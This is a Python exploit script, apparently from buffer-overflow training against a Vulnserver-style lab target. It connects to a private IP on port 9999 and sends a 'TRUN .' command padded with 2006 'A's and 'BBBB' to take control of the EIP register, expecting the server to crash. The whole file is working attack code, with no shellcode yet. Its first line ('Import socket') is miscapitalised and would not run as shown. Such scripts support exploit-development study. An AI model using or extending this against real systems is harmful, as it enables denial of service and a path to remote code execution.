Import socket

# Define the target server IP and Port
target_ip = '192.168.1.136'
target_port = 9999

# 2006 'A's followed by 'BBBB' to check EIP control
buffer = b'A' * 2006 + b'BBBB'

# Command
command = b'TRUN'
command_magic = b' .'

try:
        # Create a socket object and connect to the server
        print('Exploit> Connect to target')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))

        # Receive the banner or welcome message from the server
        banner = s.recv(1024).decode('utf-8')
        print(f'Server> {banner}')

        # Control EIP
        print(f'Exploit> Sending buffer to overflow EIP')
        control_eip = command + command_magic + buffer
        s.send(control_eip)

        # Receive the response
        print('Exploit> The target server is expected to crash. No response will be received.')
        try:
                response = s.recv(1024).decode('utf-8')
                print(f'Server> {response}')
        except Exception as e:
                print(f'Exploit> No response received. The server likely crashed due to the buffer overflow.')

except Exception as e:
        # Exception handling
        print(f'An error occurred: {str(e)}')

finally:
        # Close the connection
        s.close()
